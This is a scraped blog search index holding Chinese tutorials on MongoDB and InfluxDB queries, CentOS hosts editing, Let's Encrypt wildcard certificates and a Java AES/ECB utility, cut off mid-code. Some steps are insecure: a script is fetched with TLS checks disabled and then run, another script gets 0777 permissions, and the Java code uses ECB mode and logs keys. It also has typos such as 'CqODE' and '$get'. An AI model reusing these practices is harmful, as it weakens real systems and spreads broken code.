声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/21/200321-MongoDb系列教程一-基本概念/"},{"title":"200326-MongoDb系列教程五：集合 Collection","text":"集合，相当于关系型数据库中的table，在mongodb中，集合的概念非常贴切，属于文档(Document)的集合 其最大的特点是： 没有固定的结构 1. 创建集合创建命令如: db.createCollection(name, options) 重点看一下参数options的可选项 capped: true，表示创建固定大小的集合，需要指定size；超过数量之后，覆盖最早的文档 size: 固定集合时配套使用，KB为单位 autoIndexId: 自动为_id添加索引，默认true max: 固定集合时，文档的最大数量 一个简单的实例 12# 创建一个名为 to.insert 的集合db.createCollection('to.insert') 除此之外，新插入一个文档时，集合若不存在，也会创建对应的集合，如 12# 不推荐在集合名中包含点号，如果没有点号时，可以通过 db.test_collection.insert({'a': 1})来插入数据，更简单db.getCollection('to.insert2').insert({'a': 123, 'b': 456}) 2. 查看集合通过 show collections 查看数据库下的集合列表 3. 删除集合通过命令 db.col.drop()来删除 4. 命名规则 不能全是空白字符 不应包含特殊字符 不要以system.开头 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/26/200326-MongoDb系列教程五-集合-Collection/"},{"title":"200403-Influx Sql系列教程十：query数据查询基本篇三","text":"前面介绍了两篇influxdb的查询基本操作姿势，然后有些小伙伴在实际的使用过程中，发现了一些有意思的问题，这里单独开一篇进行说明 1. select tag 无返回select的查询语句格式定义如下 1select \"&lt;field_key&gt;\"::field,\"&lt;tag_key&gt;\"::tag from xxx 当我们查询字段中，只有tag时，就会发现啥都没有 当我们需要查询tag value值时，请使用下面的方式 1show tag values from measurements on key=\"tagKey\" 如下 2. distinct(tag) 无返回distinct函数主要用于去重，但是请注意函数内的只能是field，不能是tag，官方文档有说明 3. 模糊查询influxdb的查询条件支持正则表达式，无论是tag，还是field都是可以的 语法如下 1where [tagName|fieldName]=~/xxx/ 演示如下 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/04/03/200403-Influx-Sql系列教程十-query数据查询基本篇三/"},{"title":"200326-MongoDb系列教程六：文档 Document 插入姿势","text":"文档相当于关系数据库中数据行，也是我们最关心的数据本身；以BSON格式存储（和json区别不大） 我们通常所说业务开发者的CURD四大技能，在mongodb中，就是针对Document而言，接下来我们先看一下文档的新增使用姿势 1. 基本语法插入语法： db.collection.insert() 因为集合不要求定义数据结构，所以插入的文档格式理论上可以完全不一样，可以拥有完全不同的数据结构，相同的字段拥有不同的数据类型 2. 实例演示下面给出几个实例进行说明 基本数据类型插入 123# 插入两个数据，注意age的数据类型不一样哦db.doc_demo.insert({'name': 'yihui', 'age': 18})db.doc_demo.insert({'address': 'China', 'age': 18.8}) 数组类型插入 1db.doc_demo.insert({'name': 'yihui', 'skill': ['java', 'python', 'php', 'js']}) Object类型插入 1db.doc_demo.insert({'name': 'yihui', 'site': {'blog':'https://blog.hhui.top', 'spring': 'https://spring.hhui.top'}}) 3. 数据类型mongodb支持的基本数据类型，除了我们常见的string,int,float,boolean之外，还有一些其他的; 数据类型 说明 String 字符串， UTF8编码 Integer 整型，32/64位 Boolean 布尔 Double 浮点 Min/Max keys 将一个值与 BSON（二进制的 JSON）元素的最低值和最高值相对比 Array 数组 Timestamp 时间戳，记录文档修改或添加的具体时间 Object 内嵌文档 Null 创建空值 Symbol 符号。该数据类型基本上等同于字符串类型，但不同的是，它一般用于采用特殊符号类型的语言。 Date 日期，用 UNIX 时间格式来存储当前日期或时间。你可以指定自己的日期时间：创建 Date 对象，传入年月日信息。 ObjectID 对象ID Binary Data 二进制 code 代码类型。用于在文档中存储 JavaScript 代码。 Regular expression 正则表达式类型。用于存储正则表达式。 ObjectId 类似唯一主键，可以很快的去生成和排序，包含 12 bytes，含义是： 前 4 个字节表示创建 unix 时间戳,格林尼治时间 UTC 时间，比北京时间晚了 8 个小时 接下来的 3 个字节是机器标识码 紧接的两个字节由进程 id 组成 PID 最后三个字节是随机数 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/26/200326-MongoDb系列教程六-文档-Document-插入姿势/"},{"title":"200328-MongoDb系列教程九：文档 Document 查询基础篇","text":"MongoDb文档查询，主要借助find方法来完成，在实际的业务开发中，为了满足各种复杂的业务场景，查询的姿势也是各种各样，本篇则主要介绍基本的使用姿势，不涉及到聚合、排序、分页相关内容 1. 查询语法查询语法定义比较简单，复杂的是查询条件的组合；语法定义如下 1db.collection.find(query, projection) query: 查询条件，如果不填，则表示查询所有文档 projection: 查询需要返回的field，如果不填则返回所有的数据 此外为了mongo-cli的返回结果更加友好，可以在最后添加.pretty()，使输出更友好 2. 查询所有1db.doc_demo.find() 3. 根据条件精准查询1db.doc_demo.find({'name': '一灰灰'}) 4. 数字比较查询对于数字类型的field，可以借助符号$gt(&gt;), $get(&gt;=), $lt(&lt;), $lte(&lt;=), $ne(!=) 来表示具体的操作 12345#查询age&gt;18的文档db.doc_demo.find({'age': {$gt: 18}})# 查询age&lt;20的文档db.doc_demo.find({'age': {$lt: 20}}) 5. 模糊查询在mysql中有一个like用于模糊查询，在mongodb中，同样支持基于正则的模糊查询 12345678# 查询name以灰灰结尾的文档db.doc_demo.find({'name': /灰灰$/})# 查询name中包含 lo 字符的文档db.doc_demo.find({'name': /lo/})# 查询name中包含l, g字符的文档db.doc_demo.find({'name': /l.g/})# 查询name以一灰灰开头的文档db.doc_demo.find({'name': /^一灰灰/}) 6. and条件多个查询条件需要满足时，并不需要什么特殊的操作，只需要在查询bson中，加上多个条件即可 12# 查询age &gt; 18, 且name为 一灰灰blog的文档db.doc_demo.find({'age': {$gt: 18}, 'name':'一灰灰blog'}) 7. or条件和and不需要额外的操作不同，or条件需要借助 $or 来实现，语法如下 1db.collection.find({$or: [{queyr1, query2}]}) 实例如下： 12# 查询age &gt; 18, 且name为 一灰灰blog的文档 或 age &lt; 20 且name为一灰灰的文档db.doc_demo.find({$or: [{'age': {$gt: 18}, 'name':'一灰灰blog'}, {'age': {$lt: 20}, 'name': '一灰灰'}]}) 8. 限制返回成员有些时候我们只需要获取文档中的部分成员，可以在第二个参数中进行指定，规则如下 成员名: 1： 表示这个成员需要返回 成员名: 0： 表示这个成员不返回 12345# 表示返回的结果中，除了_id之外，其他的正常返回db.doc_demo.find({}, {'_id': 0})# 表示返回的结果中，除了_id之外，就只要name和agedb.doc_demo.find({}, {'name': 1, 'age': 1}) 请注意，一般在使用了 成员名: 1 来指定返回field时，会自动返回_id，如果不需要，请显示加上 _id: 0 9. field类型查询根据field的成员类型来作为查询条件，一般有两种方式，这里只介绍更优雅的，语法如下 1{field: {$type: '类型'}} 举例说明 1db.doc_demo.find({'skill': {$type: 'array'}}) 10. 存在查询mongodb的一个特点就是集合的结构不固定，所以某个成员可能存在也可能不存在，所以当我们的查询条件中需要加一个是否存在的判断时，可以如下 1234# 查询tag存在的文档db.doc_demo.find({'tag': {$exists:true}})# 查询tag不存在的文档db.doc_demo.find({'tag': null}) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/28/200328-MongoDb系列教程九-文档-Document-查询基础篇/"},{"title":"200413-Centos hosts修改及生效","text":"centos域名绑定与生效 12345# 修改域名vim /etc/hosts# 生效/etc/init.d/network restart II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/04/13/200413-Centos-hosts修改及生效/"},{"title":"200331-MongoDb系列教程十：文档 Document 查询高级篇","text":"上一篇的mongodb查询，主要介绍的是一些基本操作，当然有基本就高阶操作； 本文将带来更多的查询姿势 排序 分页 聚合 1. 排序在mongodb中，使用sort方法进行排序，语法如下 1db.collection.find().sort({key: 1}) 请注意，sort内部是一个对象，key为field，value为1或者-1，其中1表示升序，-1表示降序 实例说明，根据age进行排序 1db.doc_demo.find().sort({'age': 1}) 输出如下: 上面的演示属于常规的操作，但是针对mongodb的特点，自然会有一些疑问 q1: 如果某个文档没有包含这个field，排序是怎样的？ 1db.doc_demo.find().sort({'tag': 1}) 从输出来看，升序时，不包含这个field的文档，在最前面；降序时，不包含这个field的文档，在最后面 q2: 支持多个field排序吗？ 原则上一般不建议多个field的排序（比较影响性能），但对于数据库而言，你得支持吧 12345678# 在开始之前，先改一下tag，让文档不完全一致db.doc_demo.update({\"_id\": ObjectId(\"5e7b5ac10172dc950171c488\")}, {$set: {'tag': 2}})db.doc_demo.update({\"_id\": ObjectId(\"5e7b5bb085a742842d2e23fc\")}, {$set: {'tag': 2}})# 先根据age进行升序排，当age相同的，根据tag降序排db.doc_demo.find().sort({'age': 1, 'tag': -1})# 先根据tag进行升序排，tag相同的，根据age升序排db.doc_demo.find().sort({'tag': 1, 'age': 1}) 请注意上的输出，在涉及到多个field排序时，优先根据第一个进行排序，当文档的field相同时，再根据后面的进行排序 2. 分页当文档很多时，我们不可能把所有的文档一次返回，所以就有了常见的分页，在sql中我们一般使用limit offset来实现分页，在mongodb中也差不多 limit() 限制返回的文档数 1db.doc_demo.find().limit(2) skip() 使用limit进行返回条数限制，使用skip进行分页，表示跳过前面的n条数据 12# 跳过第一条数据，返回两条； 相当于返回第2、3条数据db.doc_demo.find().limit(2).skip(1) 3. 聚合使用aggregate()来实现聚合，用于处理求和、平均值，最大值，分组等 数据准备: 1234{ &quot;_id&quot; : ObjectId(&quot;5e7b5ac10172dc950171c488&quot;), &quot;name&quot; : &quot;一灰灰blog&quot;, &quot;age&quot; : &quot;19&quot;, &quot;skill&quot; : [ &quot;java&quot;, &quot;python&quot;, &quot;sql&quot; ], &quot;tag&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;5e7b5ac40172dc950171c489&quot;), &quot;name&quot; : &quot;一灰灰blog&quot;, &quot;age&quot; : 20, &quot;skill&quot; : [ &quot;web&quot;, &quot;shell&quot;, &quot;js&quot; ], &quot;tag&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;5e7b5bb085a742842d2e23fc&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;age&quot; : 18, &quot;sex&quot; : &quot;man&quot;, &quot;tag&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;5e7b5c2e0172dc950171c48a&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;age&quot; : 18, &quot;hobby&quot; : [ &quot;play game&quot; ] } 分组查询 根据name进行分组统计 123# 根据name进行分组，统计文档数量# 相当于sql中的 select name, count(1) from doc_demo group by namedb.doc_demo.aggregate([{$group: {_id: \"$name\", size: {$sum: 1}}}]) 请注意，分组的条件中 _id: 表示根据哪个字段进行分组 size: {}: 表示聚合条件指定，将结果输出到名为size的field中 filed名前加$进行指定 当前mongodb支持的聚合表达式包括: 表达式 说明 举例说明 sum 求和 db.doc_demo.aggregate([{$group: {_id: &quot;$name&quot;, size: {$sum: '$age'}}}]) avg 平均值 db.doc_demo.aggregate([{$group: {_id: &quot;$name&quot;, size: {$avg: '$age'}}}]) min 取最小 db.doc_demo.aggregate([{$group: {_id: &quot;$name&quot;, age: {$min: '$age'}}}]) max 取最大 db.doc_demo.aggregate([{$group: {_id: &quot;$name&quot;, age: {$max: '$age'}}}]) push 结果插入到一个数组中 db.doc_demo.aggregate([{$group: {_id: &quot;$name&quot;, age: {$push: '$age'}}}]) addToSet 结果插入集合，过滤重复 db.doc_demo.aggregate([{$group: {_id: &quot;$name&quot;, age: {$addToSet: '$age'}}}]) first 第一个 db.doc_demo.aggregate([{$group: {_id: &quot;$name&quot;, age: {$first: '$age'}}}]) last 最后一个 db.doc_demo.aggregate([{$group: {_id: &quot;$name&quot;, age: {$last: '$age'}}}]) 上面虽然介绍了分组支持的一些表达式，但是没有查询条件，难道只能针对所有的文档进行分组统计么？ 分组过滤 借助$match来实现过滤统计，如下 1234db.doc_demo.aggregate([ {$match: {'tag': {$gt: 1}}}, {$group: {_id: '$name', age: {$sum: 1}}}]) 请注意，$match的语法规则和find的查询条件一样，会将满足条件的数据传递给后面的分组计算 这种方式和liux中的管道特别相似，aggregate方法的参数数组中，前面的执行完毕之后，将结果传递给后面的继续执行，除了$match和$group之外，还有一些其他的操作 操作 说明 $project 修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档。 $match 用于过滤数据，只输出符合条件的文档。$match使用MongoDB的标准查询操作。 $limit 用来限制MongoDB聚合管道返回的文档数。 $skip 在聚合管道中跳过指定数量的文档，并返回余下的文档。 $unwind 将文档中的某一个数组类型字段拆分成多条，每条包含数组中的一个值。 $group 将集合中的文档分组，可用于统计结果。 $sort 将输入文档排序后输出。 $geoNear 输出接近某一地理位置的有序文档。 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/31/200331-MongoDb系列教程十-文档-Document-查询高级篇/"},{"title":"200327-MongoDb系列教程八：文档 Document 更新姿势","text":"本篇介绍update/save两种方法提供的更新姿势 1. update用于更新已经存在的文档，语法如下 123456789db.collection.update( &lt;query&gt;, &lt;update&gt;, { upsert: &lt;boolean&gt;, multi: &lt;boolean&gt;, writeConcern: &lt;document&gt; }) query: 查询条件 update: 更新语句 upsert: （可选）true, 不存在update的记录时插入；默认是false，不插入 multi: (可选) true，表示更新所有满足条件的记录；默认false，只更新第一条 writeConcern: (可选)，抛出异常的级别 插入两条用于测试的数据 12db.doc_demo.insert({'name': '一灰灰', 'age': 19, 'skill': ['java', 'python', 'sql']})db.doc_demo.insert({'name': '一灰灰blog', 'age': 20, 'skill': ['web', 'shell', 'js']}) 下面给出几个更新的实例 更新age 1234# 将name为\"一灰灰\"的文档age + 1db.doc_demo.update({'name':'一灰灰'}, {$inc: {'age': 1}})# 修改namedb.doc_demo.update({'name':'一灰灰'}, {$set: {'name': '一灰灰Blog'}}) 更新所有age为20的文档，新增一个tag成员 1db.doc_demo.update({'age': 20}, {$set: {'tag': 1}}, {multi:true}) 更新一个不存在的文档 1db.doc_demo.update({'name': '一灰灰'}, {$set: {'age': 18, 'sex': 'man'}}, {upsert: true}) 2. savesave最大的特点是覆盖，用新的文档完全覆盖旧的文档；而update，则是更新指定的field 语法如下： 123456db.collection.save( &lt;document&gt;, { writeConcern: &lt;document&gt; }) 举例如下 1db.doc_demo.save({'name': '一灰灰', 'age': 22, 'hobby': ['reading', 'walking']}) 那么问题来了，怎样判定是新增一条记录，还是覆盖已经存在的记录呢？ 有唯一键来判定 即：如果save的文档中，某个field有唯一性要求，那么当数据库中存在这个field文档文档时，执行覆盖操作；否则执行插入 举例如下, 指定ObjectId 1db.doc_demo.save({ \"_id\" : ObjectId(\"5e7b5c2e0172dc950171c48a\"), \"name\" : \"一灰灰New\", \"age\" : 18, \"hobby\" : [ \"play game\" ] }) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/27/200327-MongoDb系列教程八-文档-Document-更新姿势/"},{"title":"200408-MongoDb系列教程十一：文档 Document 查询非典型篇","text":"前面介绍的查询可以说是常见的典型case，但是mongodb中有两个比价特殊的数据类型，数组 + 对象，自然的也会有一些非典型的查询case，下面主要针对这两种数据类型的查询姿势，给出实例讲解 1. 数组首先准备一些供数组操作的文档如下 12345{ &quot;_id&quot; : ObjectId(&quot;5e7b5ac10172dc950171c488&quot;), &quot;name&quot; : &quot;一灰灰blog&quot;, &quot;age&quot; : 19, &quot;skill&quot; : [ &quot;java&quot;, &quot;python&quot;, &quot;sql&quot; ], &quot;tag&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;5e7b5ac40172dc950171c489&quot;), &quot;name&quot; : &quot;一灰灰blog&quot;, &quot;age&quot; : 20, &quot;skill&quot; : [ &quot;web&quot;, &quot;shell&quot;, &quot;js&quot; ], &quot;tag&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;5e7b5bb085a742842d2e23fc&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;age&quot; : 18, &quot;sex&quot; : &quot;man&quot;, &quot;tag&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;5e7b5c2e0172dc950171c48a&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;age&quot; : 18, &quot;hobby&quot; : [ &quot;play game&quot; ] }{ &quot;_id&quot; : ObjectId(&quot;5e7c5627f020f58f5323e52d&quot;), &quot;name&quot; : &quot;一灰灰2&quot;, &quot;age&quot; : 22, &quot;skill&quot; : [ &quot;android&quot;, &quot;ios&quot; ] } 长度查询 根据数组长度进行查询，借助$size来统计数组长度 12# 查询数组长度为3的文档db.doc_demo.find({'skill': {$size: 3}}) 长度范围查询 请注意，不支持长度的比较查询，如下，会报语法错误 1db.doc_demo.find({'skill:{$size: {$gt: 2}}}) 要实现范围查询，可以借助$where来实现($where比较强大，后面单独说明) 12# 请注意判空需要有db.doc_demo.find({$where:'this.skill !=null &amp;&amp; this.skill.length&gt;2'}) 数组内容查询 根据数组内容进行查询，常见的有两种方式，一个是直接根据数组定位比较如 12# 查询skill数组中，第一个元素为java的文档db.doc_demo.find({'skill.0': 'java'}) 上面这种实用性可能并不大，另外一个常见的case就是查询数组中包含某个元素的文档，这时可以借助$elemMatch来实现 12# 查询skill数组中包含 java 元素的文档db.doc_demo.find({'skill': {$elemMatch: {$eq: 'java'}}}) 说明，当数组的元素是Object类型时，还可以用右边这种姿势：db.doc_demo.find({'skill': {$elemMatch: {'subField': 'xxx'}}}) 2. Object因为mongodb支持内嵌文档，所以根据内嵌文档进行查询的场景也是不少的 首先准备三个用于后续查询测试的文档 123{ &quot;_id&quot; : ObjectId(&quot;5e7c5a61f020f58f5323e52e&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;doc&quot; : { &quot;title&quot; : &quot;简单的标题&quot;, &quot;content&quot; : &quot;简单的内容&quot;, &quot;tag&quot; : [ &quot;java&quot;, &quot;后端&quot; ] } }{ &quot;_id&quot; : ObjectId(&quot;5e7c5a8af020f58f5323e52f&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;doc&quot; : { &quot;title&quot; : &quot;哈哈&quot;, &quot;content&quot; : &quot;嘻嘻哈哈&quot;, &quot;tag&quot; : [ &quot;随笔&quot; ], &quot;draft&quot; : true } }{ &quot;_id&quot; : ObjectId(&quot;5e7c5ae7f020f58f5323e530&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;doc&quot; : { &quot;title&quot; : &quot;22&quot;, &quot;content&quot; : &quot;3333&quot;, &quot;tag&quot; : [ &quot;随笔&quot; ], &quot;draft&quot; : false, &quot;visit&quot; : 10 } } 根据内嵌文档字段查询 查询姿势和field查询相似，只是需要注意一下key的语法为: field.subField, 实例如下 1db.doc_demo.find({'doc.title': '22'}) 存在性查询 查询嵌入文档包含某个field的case，和普通的查询姿势也一样 1db.doc_demo.find({'doc.visit': {$exists: true}}) 排序 根据Object的成员进行排序，操作姿势也基本一样 1db.doc_demo.find({'doc': {$exists: true}}).sort({'doc.visit': -1}) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/04/08/200408-MongoDb系列教程十一-文档-Document-查询非典型篇/"},{"title":"200420-Let’s Encrypt 通配符配置，为你的根域名添加https证书","text":"现在站点不挂个https，就连微信分享都开不了，然而商用https证书又特别贵，作为草根想搞个https证书，有下面两种方案： 可以到阿里云的控制台上申请免费证书（必须备案，一年有效期，一个域名一个证书） 另外一个方案就是利用let’s encrypt来申请证书（支持通配符，即多个域名一个证书） 下面手把手教你利用let’s encrypt进行证书申请 1. 准备我们这里借助 certbot 来安装依赖包，和后续的一些必要操作 123wget https://dl.eff.org/certbot-auto --no-check-certificatechmod +x ./certbot-autocp certbot-auto /usr/local/bin/ 其次借助开源项目: https://github.com/ywdblog/certbot-letencrypt-wildcardcertificates-alydns-au 进行通配证书生成 123git clone https://github.com/ywdblog/certbot-letencrypt-wildcardcertificates-alydns-au certbotcd certbotchmod 0777 au.sh 2. 配置下面的操作，都在certbot目录下， a. 配置根域名进入domain.ini，查看是否包含你的根域名，没有则添加 1vim domain.ini b. 配置DNS密钥因为我域名是在阿里云上购买，下面贴出阿里云的密钥配置流程，登录阿里云控制台，点击个人账号，进入AccessKey管理 然后创建一个AccessKey，记录生成的key,secret，然后填写在下面的文件中 1vim au.sh c. 安装依赖并测试执行下面脚本，进行依赖安装与测试 1certbot-auto certonly -d \"*.hhui.top\" --manual --preferred-challenges dns --dry-run --manual-auth-hook \"/home/soft/letsencrypt/certbot/au.sh php aly add\" --manual-cleanup-hook \"/home/soft/letsencrypt/certbot/au.sh php aly clean\" 说明： -d &quot;*.hhui.top&quot; 这里双引号内替换为自己的域名，*表示通配，支持如blog.hhui.top, spring.hhui.top的二级域名证书 --dry-run 这个表示用于验证 /home/soft/letsencrypt/certbot/au.sh php aly add 分为四部分 /xx/au.sh 表示完整的脚本路径 php: &gt;4; 可以替换为python, 支持2.7/3.7 aly: 阿里云，腾讯用txy，华为用 hwy add: 增加dns d. 生成证书并使用1./certbot-auto certonly -d \"*.hhui.top\" --manual --preferred-challenges dns --manual-auth-hook \"/home/soft/letsencrypt/certbot/au.sh php aly add\" --manual-cleanup-hook \"/home/soft/letsencrypt/certbot/au.sh php aly clean\" 上面执行的过程中，需要输入邮箱、等各种信息，按照提示输入即可 最终生成的签名在目录 /etc/letsencrypt/live/hhui.top （最后最后一个为你的域名） privkey.pem: nginx配置时，用到的ssl_certificate_key cert.pem: nginx配置时，用到的ssl_certificate 如一个简单的nginx配置如下（配置完成之后注意重启nginx) e. 续期使用let’s encrypt进行签名的证书，只有90天的有效期，如果不想每次快到期之前，人工的再处理，可以考虑通过定时任务来续期 使用crontab来处理 10 3 */7 * * certbot-auto renew --manual --preferred-challenges dns --deploy-hook \"/app/soft/nginx/sbin/nginx -s reload\" --manual-auth-hook \"/home/soft/letsencrypt/certbot/au.sh php aly add\" --manual-cleanup-hook \"/home/soft/letsencrypt/certbot/au.sh php aly clean\" 注意参数--deploy-hook，用于续期成功之后，重启nginx 说明 2020.04.04 国内出现dns解析污染，导致域名a771.dscq.akamai.net解析有问题，如果有非大陆的机器，可以考虑在上面执行，然后把证书捞过来 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/04/20/200420-Let’s-Encrypt-通配符配置，为你的根域名添加https证书/"},{"title":"200430-Java实现AES ECP PKCS5Padding加解密工具类","text":"Java 实现一个AES/ECB/PKCS5Padding 加解密算法工具类 加密算法： AES 模式： ECB 补码方式： PKCS5Padding 1. 工具类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104import lombok.Getter;import lombok.Setter;import lombok.extern.slf4j.Slf4j;import org.springframework.util.Base64Utils;import javax.crypto.Cipher;import javax.crypto.spec.SecretKeySpec;import java.io.BufferedInputStream;import java.io.InputStream;import java.net.HttpURLConnection;import java.net.URL;import java.security.MessageDigest;/** * Created by @author yihui in 19:12 20/1/2. */@Slf4jpublic class EncryptUtil { private static final String KEY_ALGORITHM = \"AES\"; /** * 算法/模式/补码方式 */ private static final String DEFAULT_CIPHER_ALGORITHM = \"AES/ECB/PKCS5Padding\"; private static final String CODE = \"utf-8\"; @Setter @Getter public static String encryptKey; public static String encrypt(String content) { return encrypt(content, encryptKey); } /** * 加密 * * @param content * @param key * @return * @throws Exception */ public static String encrypt(String content, String key) { try { byte[] encrypted = encrypt2bytes(content, key); return Base64Utils.encodeToString(encrypted); } catch (Exception e) { log.error(\"failed to encrypt: {} of {}\", content, e); return null; } } public static byte[] encrypt2bytes(String content, String key) { try { byte[] raw = key.getBytes(CODE); SecretKeySpec secretKeySpec = new SecretKeySpec(raw, KEY_ALGORITHM); Cipher cipher = Cipher.getInstance(DEFAULT_CIPHER_ALGORITHM); cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec); return cipher.doFinal(content.getBytes(CODE)); } catch (Exception e) { log.error(\"failed to encrypt: {} of {}\", content, e); return null; } } public static String decrypt(String content) { try { return decrypt(content, encryptKey); } catch (Exception e) { log.error(\"failed to decrypt: {}, e: {}\", content, e); return null; } } /** * 解密 * * @param content * @param key * @return * @throws Exception */ public static String decrypt(String content, String key) throws Exception { return decrypt(Base64Utils.decodeFromString(content), key); } public static String decrypt(byte[] content, String key) throws Exception { if (key == null) { log.error(\"AES key should not be null\"); return null; } byte[] raw = key.getBytes(CODE); SecretKeySpec keySpec = new SecretKeySpec(raw, KEY_ALGORITHM); Cipher cipher = Cipher.getInstance(DEFAULT_CIPHER_ALGORITHM); cipher.init(Cipher.DECRYPT_MODE, keySpec); try { byte[] original = cipher.doFinal(content); return new String(original, CqODE); } catch (Exception e) { log.error(\"failed to decrypt content: {}/ key: {}, e: {}\", content, key, e); return null; } }} 请注意上面的实现，提供了两种方式 一个是AES加密之后使用base64编码输出，对应的是解密base64编码的数据 一个是AES加密之后，直接返回字节数组；也是直接解码字节数组 2. 测试case我们提供了两个加密的文件，用于解密使用； base64加解密 123456789@Testpublic void testEncrypt() throws Exception { String abc = \"Hello, 一灰灰Blog!\"; String key = \"JC66fRd3wj85k8Hr\"; String out = EncryptUtil.encrypt(abc, key); System.out.println(out); System.out.println(EncryptUtil.decrypt(out, key));} 输出结果如: 12TKrN7VKrqsAQ4JqygeHOlG21Sd3IRJ3Y11k4kOdOG4s=Hello, 一灰灰Blog! 字节数组加解密 123456789@Testpublic void testEncryptByte() throws Exception { String abc = \"Hello, 一灰灰Blog!\"; String key = \"JC66fRd3wj85k8Hr\"; byte[] out = EncryptUtil.encrypt2bytes(abc, key); System.out.println(new String(out)); System.out.println(EncryptUtil.decrypt(out, key));} 输出结果如: 123// 加密的字节数组，就是乱码... 你没看错L���R���\u0010�����Δm�I��D���Y8��N\u001b�Hello, 一灰灰Blog! 为什么有上面两种区别？ 如果我们将加密后的字节数组，直接 new String() 获得一个字符串，然后解密这个字符串，会发现解密失败哦 简单修改一下上面的测试用例 12345678910@Testpublic void testEncryptByte() throws Exception { String abc = \"Hello, 一灰灰Blog!\"; String key = \"JC66fRd3wj85k8Hr\"; byte[] out = EncryptUtil.encrypt2bytes(abc, key); String enc = new String(out, \"utf-8\"); System.out.println(enc); System.out.println(EncryptUtil.decrypt(enc.getBytes(\"utf-8\"), key));} 执行之后，发现解密失败 为啥会出现这样情况呢？ enc = new String(out, &quot;utf-8&quot;) 与 enc.getBytes(&quot;utf-8&quot;) 字节数组转字符串； 字符串转字节数组这两个过程会导致最终生成的字节数组，与原始的不一致!!! 解密远程资源的case 最后给一个解密远程加密的二进制文件的实例case 1234567891011121314151617private void binKey(String uri, String key) throws Exception { // 这个文件是没有base64编码，直接上传的二进制 URL url = new URL(uri); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); InputStream stream = 